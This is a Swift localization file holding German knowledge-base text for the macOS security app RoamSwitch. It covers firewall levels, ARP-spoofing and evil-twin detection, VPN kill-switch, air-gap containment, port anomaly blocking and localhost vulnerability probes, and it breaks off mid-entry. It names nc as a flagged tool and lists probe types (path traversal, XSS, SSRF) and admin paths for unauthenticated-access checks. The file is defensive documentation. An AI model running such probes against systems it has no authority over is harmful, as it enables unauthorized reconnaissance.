// ─────────────────────────────────────────────────────────────────────────────
// Mirrored from the RoamSwitch app source tree — RoamSwitch 1.17.16 (build 195).
// The RoamSwitch app is the source of truth. Do NOT edit this copy: changes here
// are not compiled into the shipping app and are overwritten on the next sync.
// Regenerate with ./scripts/sync-from-roamswitch.sh — see SYNC.md.
// ─────────────────────────────────────────────────────────────────────────────
import Foundation

// German (de) content for `RoamSwitchKnowledgeBase`.
// Translated from the English source (`RoamSwitchKnowledgeBaseContent_en.swift`).
// Every entry id here must also exist in every other
// `RoamSwitchKnowledgeBaseContent_<lang>.swift` file.
extension RoamSwitchKnowledgeBase {
    static func labelsDe() -> MarkdownLabels {
        return MarkdownLabels(
            featuresTitle: "RoamSwitch – Vollständige Funktionsspezifikation & Architektur",
            featuresIntro: "Wie jede Sicherheitsfunktion von RoamSwitch funktioniert, mit Standardwerten und Einschränkungen.",
            alertsTitle: "RoamSwitch – Katalog der Warnhinweise und Benachrichtigungen",
            alertsIntro: "Jeder Benachrichtigungsbanner, jede Warnung und jedes Notfallfenster von RoamSwitch – mit Ursache, automatisch ausgelöster Abwehrmaßnahme und empfohlenen Schritten.",
            settingsTitle: "RoamSwitch – Einstellungs- und Bedienungsanleitung",
            settingsIntro: "Schritt-für-Schritt-Anleitungen für jede Einstellung, jeden Schalter, jede Positivliste und jede Richtlinie in RoamSwitch.",
            troubleshootingTitle: "RoamSwitch – Problembehandlung & Häufige Fragen",
            troubleshootingIntro: "Verbindliche Antworten zu häufigen Fragen, Berechtigungen und Genehmigungen, zur Einrichtung von Homebrew / ClamAV / blueutil, zu Fehlalarmen und zum Datenschutzkonzept.",
            summary: "Zusammenfassung",
            overview: "Überblick",
            detailsHeading: "Details & Ursachen",
            adviceHeading: "Was zu tun ist",
            recommendation: "Empfehlung",
            bestPractice: "Empfohlene Einstellung",
            advice: "Hinweis"
        )
    }

    static func contentDe() -> [LocalizedEntry] {
        var list: [LocalizedEntry] = []
        list.append(contentsOf: featuresDeNetwork())
        list.append(contentsOf: featuresDeMalware())
        list.append(contentsOf: featuresDeAudit())
        list.append(contentsOf: alertsDeNetwork())
        list.append(contentsOf: alertsDeMalware())
        list.append(contentsOf: settingsDe())
        list.append(contentsOf: troubleshootingDeSetup())
        list.append(contentsOf: troubleshootingDeOperation())
        return list
    }

    // MARK: - Features: network & devices

    private static func featuresDeNetwork() -> [LocalizedEntry] {
        return [
            LocalizedEntry(
                id: "feat_network_autoswitch",
                title: "Automatische Netzwerksicherheits-Umschaltung & PF-Paketfilter (3 Stufen)",
                summary: "Gleicht die Gateway-MAC-Adresse des aktuellen Netzwerks mit Ihren registrierten Netzwerken ab und wendet automatisch dessen Schutzstufe an. Nicht registrierte Netzwerke erhalten die Stufe „Standard-Schutz unterwegs“ (anfänglich Maximale Sperre). In der kostenlosen Version enthalten.",
                details: """
                • 🟢 Vertrauenswürdig (Offen – ungeschützt): z. B. zu Hause. Firewall aus; Freigabedienste (SSH / SMB / Bildschirmfreigabe) und AirDrop erlaubt.
                • 🟡 Ausgewogen (Firewall & Tarnmodus): z. B. Arbeit oder Tethering. PF-Paketfilter und Tarnmodus blockieren Sondierungen von außen, während Freigabedienste weiter verfügbar bleiben.
                • 🔴 Maximale Sperre (Freigabe & AirDrop aus): Cafés, öffentliches WLAN, nicht registrierte Netzwerke. Sämtlicher eingehender Verkehr wird blockiert, Freigabedienste gestoppt, AirDrop deaktiviert.
                • Entscheidungslogik: Bei einem Netzwerkwechsel wird die MAC-Adresse des Gateways gelesen und mit registrierten Netzwerken abgeglichen. Pfadereignisse, die das Gateway nicht ändern (DHCP-Erneuerung, WLAN-Roaming), lösen keine vollständige Neubewertung aus.
                • Interna: Der privilegierte Helfer `RoamSwitchHelper` (über XPC) verwaltet einen eigenen `pfctl`-Anker, sodass Pakete auf Kernel-Ebene verworfen werden.
                • Manuelle Überschreibung: Unter „Manuelle Überschreibung“ können Sie je Stufe zwischen „Bis zur Trennung (Empfohlen)“, „Für 1 Stunde“, „Für 4 Stunden“ oder „Bis zum manuellen Aufheben“ wählen (siehe set_manual_override).
                • Absenkung nach dem Zustand dieses Macs (Pro, standardmäßig an): Auch in einem als „Vertrauenswürdig (Offen)“ registrierten Netzwerk bleibt die Stufe bei „Ausgewogen“, solange auf diesem Mac ein Hinweis auf eine Kompromittierung aufgezeichnet ist. Ein Hinweis ist ein Eintrag mit Schweregrad high oder höher von Ransomware (Köderdateien, Entropie), der XProtect-gekoppelten Laufzeitbedrohung, Anmeldedaten-Honeytokens, Browser-Anmeldedaten, Reverse Shells oder dem Prozessausführungs-Recorder aus den letzten 6 Stunden (das Fenster ist mit `defaults write com.tetsuharu.RoamSwitch RoamSwitch.DevicePosture.WindowHours -int N` auf 1 bis 72 Stunden einstellbar). Ein Eintrag, den eine Person mit „Freigeben“ oder „Erlauben“ geschlossen hat, zählt nicht. ARP-, Netzwerkeinstellungs-, SSH-Brute-Force-, Portanomalie- und ClickFix-Einträge zählen ebenfalls nicht, weil sie keine Kompromittierung dieses Macs sind. Die Stufe sinkt nur bis „Ausgewogen“, nie auf „Maximale Sperre“; eine manuelle Überschreibung und ein Air-Gap bleiben unangetastet. Es wird jede Minute und bei jedem neuen Eintrag neu geprüft; beim Absenken und beim Zurücksetzen gibt es je eine Mitteilung. „Geprüft (Vertrauen wiederherstellen)“ im Menü ignoriert alle Hinweise vor diesem Zeitpunkt und stellt die Stufe sofort wieder her. Abschalten über „Bei Hinweisen auf Kompromittierung vertrauenswürdige Netzwerke auf „Ausgewogen“ halten (Pro)“ im Menü.
                """,
                recommendation: "Registrieren Sie Zuhause und andere sichere Büros über „Aktuelles Netzwerk registrieren“ und lassen Sie überall sonst automatisch die Maximale Sperre gelten."
            ),
            LocalizedEntry(
                id: "feat_network_history_guard",
                title: "Netzwerkverlauf-Lernen & Evil-Twin-Erkennung (ähnliches WLAN) (Pro)",
                summary: "Lernt ausschließlich auf diesem Mac, welche Gateway-MAC-Adressen jede WLAN-SSID verwendet hat, und warnt vor einem möglichen Evil Twin (gefälschter Access Point), wenn Sie einer unbekannten SSID beitreten, deren Name einem zuvor genutzten Netzwerk verdächtig ähnelt.",
                details: """
                • Was gelernt wird: Für jede SSID die beobachteten Gateway-MAC-Adressen (bis zu 8 pro SSID, für Mesh-WLAN), gespeichert in `~/Library/Application Support/RoamSwitch/network_history.json`. Bis zu 200 SSIDs, die älteste wird zuerst entfernt. Es wird nichts vom Gerät gesendet.
                • Ähnlichkeitsprüfung: Groß-/Kleinschreibung wird ignoriert, es wird die Editierdistanz (Levenshtein) verwendet. Namen unter 6 Zeichen sind ausgenommen, und die zulässige Distanz wächst mit der Länge nur langsam (1 bis 2 Zeichen), sodass generische Standard-SSIDs wie „ASUS“ oder „TP-Link_5G“ bei zufälliger Übereinstimmung niemals auslösen.
                • Vermeidung von Fehlalarmen: Dieselbe Gateway-Hardware, die eine zweite SSID ausstrahlt (Gastnetzwerk, umbenannter Router), wird nicht gemeldet. Eine bekannte SSID mit neuer Gateway-MAC (Router ausgetauscht) wird nur aufgezeichnet, löst aber allein keinen Alarm aus.
                • Während ARP-Spoofing erkannt wird, wird die Beobachtung übersprungen, damit die MAC-Adresse eines Angreifers niemals als legitim gelernt wird.
                • Die Warnung ist eine Echtzeitbenachrichtigung, die in Pro versendet wird. Der gelernte Verlauf ist über das MCP-Tool `get_network_history` abrufbar.
                • macOS gibt den WLAN-Namen (SSID) nur an Apps mit Berechtigung für Ortungsdienste weiter. Ohne den Namen läuft die Erkennung täuschend ähnlicher gefälschter Zugangspunkte nicht. Das Menü zeigt „verbunden (Name nicht verfügbar)“, die Verschlüsselungsart wird auch ohne Namen geprüft. Über den Menüeintrag lesen Sie den Grund und können auf Wunsch die Berechtigung für Ortungsdienste anfordern (RoamSwitch liest den Standort des Macs nicht).
                """,
                recommendation: "Geben Sie bei dieser Warnung keine Zugangsdaten in diesem WLAN ein und prüfen Sie den echten Netzwerknamen und Standort. Ein VPN-Tunnel (feat_vpn_tunnel) ist die zuverlässigste Gegenmaßnahme."
            ),
            LocalizedEntry(
                id: "feat_arp_spoof_guard",
                title: "ARP-Spoofing-Erkennung (Identitätsvortäuschung im Netzwerk) & automatische Blockierung (Pro)",
                summary: "Erkennt ARP-Spoofing, bei dem ein Angreifer im selben Netzwerk den Router vortäuscht, um Datenverkehr abzuhören oder zu manipulieren (Man-in-the-Middle). Bei Maximaler Sperre wird das Netzwerk sofort getrennt, auf anderen Stufen erfolgt nur eine Benachrichtigung mit der Entscheidung bei Ihnen.",
                details: """
                • Erkennung: Die IP-Adresse des Standard-Gateways bleibt gleich, während sich seine MAC-Adresse plötzlich ändert. Zusätzlich zu Netzwerkwechsel-Ereignissen erfasst eine eigene 15-Sekunden-Abfrage auch Angriffe, die mitten in einer Sitzung beginnen.
                • Reaktion: In einem Netzwerk mit Maximaler Sperre erfolgt sofortige Air-Gap-Eindämmung (feat_airgap_containment). Bei Vertrauenswürdig oder Ausgewogen erfolgt nur eine Benachrichtigung, und Sie können die Eindämmung über „Port- & Geräteüberwachung“ mit „ARP-Spoofing erkannt – jetzt gesamtes Netzwerk trennen“ selbst auslösen. Das verhindert Fehlalarme durch Router-Neustarts oder Mesh-Roaming und verhindert, dass ein einzelnes gefälschtes ARP-Paket zu einem selbst verursachten Ausfall missbraucht wird.
                • Standard: Der Menüpunkt „Automatische Blockierung bei ARP-Spoofing (Identitätsvortäuschung im Netzwerk) (Pro)“ wird bei der ersten Aktivierung einer Pro-Lizenz automatisch eingeschaltet (set_pro_default_guards).
                • Einordnung: Dies ist die nachträgliche Reaktion. Die Vorbeugung übernehmen Gateway-ARP/NDP-Fixierung (feat_gateway_arp_lock) und der VPN-Tunnel (feat_vpn_tunnel).
                • Vorfälle werden als MITRE-ATT&CK-T1557 in der Vorfall-Zeitleiste (feat_containment_incident_timeline) festgehalten.
                """,
                recommendation: "Lassen Sie diese Funktion aktiviert. Für stärkeren MITM-Schutz ergänzen Sie den VPN-Tunnel; für Vorbeugung ohne zusätzliche Infrastruktur ergänzen Sie die Gateway-ARP/NDP-Fixierung."
            ),
            LocalizedEntry(
                id: "feat_gateway_arp_lock",
                title: "Gateway-ARP/NDP-Fixierung (Vorbeugend) (Pro)",
                summary: "Fixiert beim Beitritt zu einem nicht vertrauenswürdigen Netzwerk die MAC-Adressen von Gateway, IPv6-Router und jedem lokalen DNS-Server als statische Nachbarschafts-Cache-Einträge, um ARP/NDP-Spoofing-MITM-Angriffe von vornherein zu verhindern. Standardmäßig deaktiviert.",
                details: """
                • Aktivierung: „Port- & Geräteüberwachung“ → „Gateway-ARP/NDP in nicht vertrauenswürdigen Netzwerken fixieren (vorbeugend) (Pro)“.
                • Funktionsweise: Beim Verbinden werden die aktuellen MAC-Adressen gelesen, und der Helfer fixiert sie mit `arp -s` / `ndp -s` als permanente Einträge. Der Kernel ignoriert danach gefälschte ARP-Antworten und Nachbarschaftsankündigungen für diese IPs.
                • Umfang: Nur diese drei Arten von Einträgen. In Vertrauenswürdigen (offenen) Netzwerken wird nichts fixiert, sodass ein Neustart des Heimrouters nie die Verbindung unterbricht. Bei jedem Netzwerkwechsel werden die Fixierungen gelöscht und neu erstellt.
                • Einschränkung (Vertrauen bei erster Nutzung): Die zuerst beobachtete MAC-Adresse wird vertraut, sodass ein bereits vor Ihrer Verbindung anwesender Angreifer seine MAC-Adresse fixieren lassen könnte. Wenn Sie diese Annahme nicht akzeptieren können, nutzen Sie den VPN-Tunnel.
                • Wird im Punkt „Gateway-ARP-Fixierung (präventiver MITM-Schutz)“ der Mac-Sicherheitsprüfung berücksichtigt.
                """,
                recommendation: "Ein guter, leichtgewichtiger MITM-Schutz, wenn ein VPN nicht praktikabel ist. Kann mit dem VPN-Tunnel kombiniert werden (das VPN ist die primäre Verteidigung, dies eine Ergänzung)."
            ),
            LocalizedEntry(
                id: "feat_vpn_tunnel",
                title: "VPN-Tunnel (WireGuard / Tailscale, mit Kill-Switch) (Pro)",
                summary: "Baut in nicht vertrauenswürdigen Netzwerken automatisch einen verschlüsselten Tunnel auf, sodass Man-in-the-Middle-Angreifer nur Chiffretext sehen. Wählen Sie WireGuard (Konfigurationsdatei) oder Tailscale (Exit-Node) als Backend. Hängt nicht von der Integrität der Schicht 2 (ARP/NDP) ab und ist damit die primäre Anti-MITM-Verteidigung. Keine Network-Extension-Berechtigung erforderlich.",
                details: """
                • Backend: „Port- & Geräteüberwachung“ → „VPN-Tunnel (Anti-MITM in nicht vertrauenswürdigen Netzwerken) (Pro)“ → „Backend“, dann WireGuard oder Tailscale wählen. Nur das gewählte Backend läuft.
                • WireGuard: Benötigt `wireguard-tools` von Homebrew (`brew install wireguard-tools`). Konfiguration mit „WireGuard-Konfiguration (.conf) importieren…“ laden. Die Konfiguration stellen Sie selbst bereit (Mullvad, IVPN, Proton VPN, eigener Server, Arbeitgeber); RoamSwitch stellt keine VPN-Server bereit.
                • WireGuard-Kill-Switch: pf setzt „block drop all“ mit Durchlässen nur für lo, die Tunnelschnittstelle, den UDP-Handshake zum Endpunkt, DHCP und ICMP. Solange der Tunnel unten ist, wird nichts im Klartext übertragen.
                • Tailscale: Für Personen, die Tailscale bereits nutzen. RoamSwitch installiert es nicht und meldet sich nicht an; es liest `tailscale status` und führt `tailscale set --exit-node=<Node>` aus. Ein Exit-Node ist erforderlich (der gesamte Verkehr läuft darüber). Ein offline befindlicher Exit-Node wird in der Statuszeile angezeigt.
                • Empfohlen wird die Tailscale-CLI (eigenständig): `brew install tailscale` → `sudo tailscaled install-system-daemon` → `sudo tailscale up`. Die App-Store-Version (GUI) lässt sich nicht per `tailscale set` von außen steuern; wählen Sie den Exit-Node dann in der Tailscale-App, RoamSwitch übernimmt nur Statusanzeige und Kill-Switch.
                • Tailscale-Kill-Switch (standardmäßig aus, Opt-in): pf lässt nur lo, Tailscales utun, CGNAT 100.64.0.0/10, DNS, STUN 3478, 41641, DERP tcp 443, DHCP und ICMP durch. Weniger strikt als WireGuard („schwer undicht zu machen“ statt völlig dicht), und in manchen Netzwerken kann er Tailscales eigene Konnektivität stören, daher optional.
                • Automatisch: Tunnel/Exit-Node wird in nicht vertrauenswürdigen Netzwerken aktiviert, in vertrauenswürdigen deaktiviert. Läuft die Lizenz ab, werden Tunnel und Kill-Switch automatisch aufgehoben.
                """,
                recommendation: "Der wirksamste Schutz bei häufiger Nutzung öffentlicher WLANs. Tailscale-Nutzer: CLI installieren und Tailscale-Backend plus Exit-Node wählen. Andernfalls ist `brew install wireguard-tools` mit der `.conf`-Datei Ihres VPN-Anbieters der einfachste Weg."
            ),
            LocalizedEntry(
                id: "feat_airgap_containment",
                title: "Notfall-Air-Gap-Eindämmung (vollständige Netzwerktrennung, WLAN-Funk aus, automatische Wiederherstellung als Sicherheitsnetz)",
                summary: "Die gemeinsame Notfall-Eindämmung, die bei Erkennung einer ernsten Bedrohung (Ransomware, XProtect-Malware-Fund, ARP-Spoofing, ClickFix) genutzt wird. Sie blockiert allen ein- und ausgehenden Datenverkehr. Auch bereits bestehende Verbindungen werden getrennt. Bei Auslösern mit geringer Sicherheit (z. B. ClickFix) kehrt die Netzwerkverbindung selbst nach einem Absturz oder Neustart spätestens nach 10 Minuten automatisch zurück. Auslöser mit hoher Sicherheit (Ransomware-Köderdatei, XProtect-Fund, ARP-Spoofing in einem Netzwerk mit maximaler Sperre, ARP-Eindämmung, die über „Jetzt gesamtes Netzwerk trennen“ aus der Spoofing-Warnung gestartet wurde) öffnen sich nie von selbst: Nach bis zu 1 Stunde vollständiger Trennung wechseln sie in einen eingeschränkten Modus, der neue ausgehende Verbindungen weiter blockiert.",
                details: """
                • Funktionsweise: Der privilegierte Helfer lädt pf mit „block drop all“ (außer Loopback) und liest es zur Bestätigung zurück. Auch ausgehender Verkehr wird gekappt, was das Abfließen von Schlüsseln oder Daten an einen C2-Server verhindert. Schlägt die Anwendung fehl, wird bis zu dreimal erneut versucht (je 8 Sekunden Timeout); schlägt es weiterhin fehl, wird „Automatische Netzwerktrennung fehlgeschlagen“ angezeigt und um manuelles Trennen gebeten. Es wird nie eine Isolation behauptet, die nicht tatsächlich vorliegt.
                • WLAN-Funk aus: pf verwirft nur Pakete, während der Adapter verbunden bleibt, daher schalten ARP-Spoofing-, Ransomware- und XProtect-Eindämmung über `networksetup` auch den WLAN-Funk selbst aus (standardmäßig an; interne Einstellung `RoamSwitch.AirGapAutoWiFiKillEnabled`). Die ClickFix-Eindämmung schaltet den Funk nicht aus.
                • Aufheben: Das Aufheben über das Notfallfenster oder die Benachrichtigung entfernt die pf-Sperre und schaltet WLAN wieder ein. Der Menüleisten-Eintrag „Air-Gap-Isolierung aufheben“ steht immer zur Verfügung, auch in der kostenlosen Version und selbst wenn eine Pro-Lizenz mitten im Vorfall abläuft. Hinweise zum Isolationsstatus (gestartet, eingeschränkt, aufgehoben, fehlgeschlagen) erhalten auch kostenlose Nutzer; die Erkennungswarnungen selbst bleiben Pro.
                • Sicherheitsnetz: Wird die Sperre nicht aufgehoben (auch nach einem App-Absturz oder Neustart des Mac), handelt ein Timer auf Helfer-Seite je nach Sicherheit des Auslösers. Geringe Sicherheit (ClickFix, allgemeine Heuristiken, ein einfacher manueller Air-Gap ohne Warnung): Nach 10 Minuten wird die Sperre zwangsweise aufgehoben und der WLAN-Funk wiederhergestellt. Hohe Sicherheit (Ransomware-Köderdatei, XProtect-Fund, ARP-Spoofing in einem Netzwerk mit maximaler Sperre, ARP-Eindämmung, die über „Jetzt gesamtes Netzwerk trennen“ aus der Spoofing-Warnung gestartet wurde): vollständiger Air-Gap für bis zu 1 Stunde, danach ein eingeschränkter Modus. Dort bleiben neue ausgehende Verbindungen (außer DHCP) blockiert, der WLAN-Funk ist aber wieder an, damit Sie sehen können, in welchem Netzwerk Sie sind. Er öffnet sich nie zeitgesteuert, sondern nur, wenn Sie ihn aufheben oder eine erneute Prüfung bestätigt, dass die Ursache beseitigt ist (z. B. der verdächtige Prozess beendet wurde). Die erneute Prüfung beginnt etwa 10 Minuten nach der Vollsperre und hebt die Isolation auf, sobald die Ursache als beseitigt bestätigt ist, ohne die 1-Stunden-Grenze abzuwarten (wie in der Linux-Edition); solange das WLAN-Funkmodul aus ist, lässt sich der ARP-Cache nicht lesen, daher erfolgt die Prüfung erst, wenn der eingeschränkte Modus das Funkmodul wieder einschaltet. Bei der ARP-Eindämmung liest die erneute Prüfung den ARP-Cache (nur solange der Eintrag des Gateways fehlt, sendet sie zuvor eine ARP-Anfrage auf der Verbindung, die die Isolation nicht blockiert, weil es kein IP-Verkehr ist) und wertet die Ursache nur dann als beseitigt, wenn die vertrauenswürdige Gateway-MAC bei 3 aufeinanderfolgenden Prüfungen über mindestens 60 Sekunden erscheint (andere MAC, fehlender oder unvollständiger Eintrag, doppelte MAC oder nicht lesbarer Cache setzen neu an). Bereits bestehende Verbindungen werden beim Aktivieren des Air-Gap und beim Wechsel in den eingeschränkten Modus getrennt.
                • Boot-Gate: Direkt nach dem Start, bevor die App ihre Richtlinie anwendet, gilt ein standardmäßig verweigerndes pf-Boot-Gate, das sich spätestens nach 90 Sekunden selbst aufhebt.
                """,
                recommendation: "Wenn die Eindämmung auslöst, lesen Sie zuerst die Benachrichtigung, beenden Sie verdächtige Apps und führen Sie einen Scan durch, bevor Sie aufheben. Wissen Sie, dass es ein Fehlalarm ist, heben Sie sofort auf."
            ),
            LocalizedEntry(
                id: "feat_port_anomaly_guard",
                title: "Automatische Blockierung unbekannter Listening-Ports & Isolation von Entwicklungsservern (Pro)",
                summary: "Überwacht jeden lauschenden TCP-Port und blockiert den LAN-Zugriff auf einen Port, sobald eine zuvor nicht exponierte ausführbare Datei plötzlich auf 0.0.0.0 zu lauschen beginnt. Entwicklungsserver und lokale KI-Server lassen sich per Klick auf 127.0.0.1 beschränken.",
                details: """
                • Überwachung: Lauschende Ports werden alle 20 Sekunden gescannt. Die Identität ist der Pfad der ausführbaren Datei, sodass eine bekannte App, die nur die Portnummer ändert, keinen Alarm auslöst. Der Zustand direkt nach der Aktivierung wird als Basislinie festgehalten.
                • Automatische Blockierung: Beginnt eine unbekannte ausführbare Datei, einen Port zu exponieren, blockiert pf nur den externen Zugriff (der Mac selbst und localhost können ihn weiterhin nutzen). So wird eine durch einen Zero-Day-Exploit eingeschleuste Backdoor erkannt, ohne die Malware-Familie zu kennen.
                • Ausgenommen: Apple-signierte Systemdienste unter `/System/Library` oder `/usr/libexec` (z. B. rapportd, benötigt für Handoff, AirPlay, AirDrop). Allzweckwerkzeuge unter `/usr/bin`, etwa `/usr/bin/python3` oder `/usr/bin/nc`, werden weiterhin gemeldet.
                • Riskante Dienste: Erkennt Dienste, die häufig ohne Authentifizierung exponiert werden, etwa Redis (6379), MongoDB (27017), Memcached (11211), Elasticsearch (9200), VNC (5900) sowie lokale KI-Server wie Ollama (11434), LM Studio (1234), Gradio (7860) und vLLM (8000).
                • Isolation von Entwicklungsservern: Öffnen Sie den Port unter „Freigegebene Ports“ und wählen Sie „Port isolieren“, um ihn auf 127.0.0.1 zu beschränken (Pro).
                • Fehlalarme: Dauerhaft erlauben über die Schaltfläche „Erlauben“ in der Benachrichtigung oder über den Port-Prüfbildschirm. Deaktivieren Sie den Schutz (oder läuft die Lizenz ab), werden alle erstellten Blockierungen aufgehoben.
                • Standard: Wird bei erstmaliger Aktivierung von Pro automatisch eingeschaltet. Der Vorfallsverlauf ist über das MCP-Tool `get_port_anomaly_incidents` abrufbar.
                """,
                recommendation: "Binden Sie Entwicklungsserver und lokale LLMs an `127.0.0.1` (z. B. `OLLAMA_HOST=127.0.0.1 ollama serve`, `npm run dev -- -H 127.0.0.1`)."
            ),
            LocalizedEntry(
                id: "feat_active_vuln_scan",
                title: "Aktive Schwachstellenverifizierung — standardmäßig deaktiviert",
                summary: "Prüft für auf diesem Mac selbst (127.0.0.1) erkannte Dienste mit minimalen, lesenden Sondierungen, ob sie tatsächlich ohne Authentifizierung antworten. Standardmäßig deaktiviert; erfordert ausdrückliches Einschalten und bei jedem Lauf eine Bestätigung.",
                details: """
                • Aktivierung: „Port- & Geräteüberwachung“ → „Aktive Schwachstellenverifizierung“. Dies schaltet nur die Schaltfläche „Aktive Verifizierung ausführen“ im Port-Prüfbildschirm frei; von selbst wird nichts gesendet, und jeder Lauf fragt zuerst „Verifizierungsanfrage senden?“.
                • Nur 127.0.0.1: Es wird niemals etwas an einen anderen Host gesendet.
                • Unauthentifizierter Zugriff: Einzelne, kurz timeoutende, nicht-destruktive Sondierungen an Redis (PING), Memcached (stats) und MongoDB (listDatabases).
                • Allgemeine Entwicklungsserver: Prüft auf CORS-Fehlkonfiguration (reflektierter Origin mit Credentials), Path Traversal, offene Weiterleitungen, reflektiertes XSS (per GET wird eine harmlose Zeichenfolge ohne Skript gesendet, um zu sehen, ob sie ungeschützt in die Seite geschrieben wird) und SSRF (ein Server, der eine übergebene URL abruft, auch wenn sie auf einen eigenen Listener auf diesem Rechner zeigt).
                • Abgleich mit bekannten CVEs: Für ohne Authentifizierung erreichbares Redis/Memcached wird die Version mit einer nicht-destruktiven Abfrage gelesen und mit bekannten CVE-Versionsbereichen verglichen. Es werden keine Exploit-Payloads gesendet.
                • Für die Ports von Entwicklungsservern (127.0.0.1) wird außerdem geprüft, ob eine Admin-Seite oder API ohne Anmeldung antwortet (Probe webvuln-unauth-admin). Ohne Cookie und ohne Zugangsdaten wird an 7 feste Pfade (/admin, /api/admin, /api/users, /api/v1/users, /api/v1/user, /actuator/env, /swagger-ui/index.html) je ein GET gesendet; gemeldet wird nur, wenn die Antwort 200 ist und Daten enthält (ein nicht leeres JSON-Array, ein JSON-Objekt, das keine Fehlermeldung ist, eine HTML-Seite mit Benutzertabelle oder Swagger UI). Eine Anmeldeseite, eine Weiterleitung, eine SPA-Hülle und {"error":"unauthorized"} werden nicht gemeldet. Es wird nie versucht, sich anzumelden, nie geraten und nie gefuzzt. Die erklärten Nebenwirkungen sind Spuren in den Logs des Ziels und mehrere Anfragen. Es soll Apps finden, die nur im Browser ein Menü verbergen und serverseitig keine Berechtigung prüfen.
                • Auch als MCP-Tool `run_active_vuln_scan` verfügbar (seine Sondierungen gehen ausschließlich an localhost).
                • Im Ergebnis des MCP-Tools trägt ein Befund, dessen Prüfung in einem früheren Lauf als unbedenklich eingestuft wurde, `previouslySafeAt` (den Zeitpunkt dieses Laufs). Das beweist nicht, dass eine Korrektur rückgängig gemacht wurde, denn ein anderes Programm am selben Port sieht genauso aus.
                """,
                recommendation: "Aktivieren Sie diese Funktion nur, wenn Sie prüfen möchten, ob Redis, Docker, ein lokales LLM o. Ä. auf Ihrem eigenen Mac wirklich ohne Authentifizierung erreichbar ist."
            ),
            LocalizedEntry(
                id: "feat_nmap_nse",
                title: "Ergänzender nmap-NSE-Scan (zusätzliche Ebene für die aktive Schwachstellenverifizierung)",
                summary: "Wenn zusätzlich die aktive Schwachstellenverifizierung aktiviert ist, führt dies mit dem installierten System-nmap NSE-Skripte der Kategorie „safe“ gegen offene Ports aus, um Protokollabdeckung zu ergänzen, die die eigenen Prüfungen dieses Produkts nicht bieten (SSH-Hostschlüssel, SMTP-Banner usw.). Das Ergebnis ist nmaps eigene Einschätzung, nicht unabhängig von diesem Produkt überprüft.",
                details: """
                • Automatisch enthalten: läuft automatisch mit, sobald „Aktive Schwachstellenverifizierung (aktive Erreichbarkeitsprüfung)“ aktiviert ist — dafür gibt es keinen eigenen Schalter. nmap wird nie automatisch installiert — dies wirkt nur, wenn es bereits auf dem System installiert ist (z. B. über Homebrew); andernfalls geschieht nichts.
                • Skriptauswahl: `safe and not broadcast and not external`. Die reine Kategorie „safe“ allein reicht nicht aus — `broadcast`-Skripte fragen nicht nur den Zielhost, sondern das gesamte LAN per Multicast/Broadcast ab, und `external`-Skripte (z. B. `vulners.nse`) senden den erkannten Dienst/die Version tatsächlich an einen Dritten wie vulners.com. Beides widerspricht dem eigenen Designprinzip dieses Produkts, nur 127.0.0.1 zu berühren und niemals einen anderen Host oder externen Server — daher der Ausschluss.
                • Timeout: 15 Sekunden pro Skript (`--script-timeout 15s`). Manche „safe“-Skripte können gegen nicht standardkonforme HTTP-APIs unbegrenzt lange laufen und ohne diese Begrenzung Ergebnisse anderer Ports verdrängen.
                • Umfang: dieselben bereits bestätigt offenen Ports wie bei der aktiven Schwachstellenverifizierung selbst.
                """,
                recommendation: "Behandeln Sie die Befunde von nmap als Referenzinformation — prüfen Sie den Inhalt und handeln Sie nur, wenn er tatsächlich relevant ist."
            ),
            LocalizedEntry(
                id: "feat_usb_keyboard_guard",
                title: "Physischer Portschutz vor unbefugtem USB / BadUSB (Tastaturgenehmigung & Tastaturanschlags-Timing-Analyse) (Pro)",
                summary: "Wird eine unbekannte USB-Tastatur oder ein manipuliertes Kabel (Rubber Ducky, O.MG Cable, Flipper Zero u. Ä.) angeschlossen, werden dessen Tastenanschläge blockiert, bis Sie das Gerät genehmigen – so wird automatisierte Befehlseinschleusung verhindert. Zusätzlich werden die Anschlagsintervalle analysiert und gewarnt, wenn sie skriptartig wirken.",
                details: """
                • Erkennung: IOHIDManager erkennt neue Tastaturen in Echtzeit. Die eingebaute Tastatur wird automatisch vertraut.
                • Blockierung: Das nicht genehmigte Gerät wird exklusiv beschlagnahmt (IOHIDDevice Seize), sodass nur dessen Tastenanschläge das System nicht erreichen; andere Tastaturen funktionieren weiter. Nur wenn die Beschlagnahme fehlschlägt, wird auf eine CGEventTap-Blockierung zurückgegriffen, die die Bedienungshilfen-Berechtigung nutzt.
                • Genehmigung: Ein Fenster im Vordergrund bietet „Vertrauen & Erlauben“ oder „Ablehnen & blockiert lassen“. Erlaubte Tastaturen kommen auf die Positivliste.
                • Tastaturanschlags-Timing-Analyse: Während der Blockierung werden die Anschlagsintervalle des Geräts weiterhin gemessen. Nach mindestens 5 Intervallen löst ein Mittelwert von 12 ms oder weniger, oder von 45 ms oder weniger bei sehr hoher Gleichmäßigkeit (Variationskoeffizient 0,35 oder darunter), eine Warnung „zeigt Anzeichen für skriptgesteuerte Eingabe“ aus. Dies erfasst maschinenartige Geschwindigkeit und Regelmäßigkeit, die kein Mensch erzeugt, dient jedoch nur als zusätzlicher Hinweis und ändert nicht die Blockierungsentscheidung.
                • Standardmäßig deaktiviert. Aktivieren Sie unter „Port- & Geräteüberwachung“ → „Physischer Portschutz vor unbefugtem USB / BadUSB (Pro)“; die Positivliste verwalten Sie unter „USB / BadUSB-Schutzeinstellungen…“. Beim Aktivieren fragt macOS nach der Berechtigung „Eingabeüberwachung“. Ohne sie wird eine neu angeschlossene Tastatur nicht erkannt.
                """,
                recommendation: "Wenn Sie externe Tastaturen verwenden, registrieren Sie nur die, die Sie selbst angeschlossen haben, mit „Vertrauen & Erlauben“. Lehnen Sie Geräte, die die Skript-Eingabe-Warnung auslösen, immer ab und trennen Sie sie."
            ),
            LocalizedEntry(
                id: "feat_usb_storage_guard",
                title: "Automatische Blockierung unbefugten USB-Speichers & automatischer ClamAV-Scan (Pro)",
                summary: "Ein USB-Laufwerk oder externes Speichermedium, das nicht auf der Positivliste steht, wird zunächst schreibgeschützt eingebunden, während Sie gefragt werden, wie zu verfahren ist. Erlaubte Geräte werden zudem mit ClamAV gescannt, bevor sie mit der konfigurierten Berechtigung verbunden werden.",
                details: """
                • Überwachung: DiskArbitration erfasst externe/entfernbare Volume-Einbindungen sofort.
                • Nicht registrierte Geräte: Werden zur Sicherheit schreibgeschützt neu eingebunden, mit einem Dialog, der „Lesen/Schreiben zulassen“, „Schreibgeschützt zulassen“ oder „Auswerfen“ anbietet. Auswerfen hängt das Gerät sofort aus und wirft es aus.
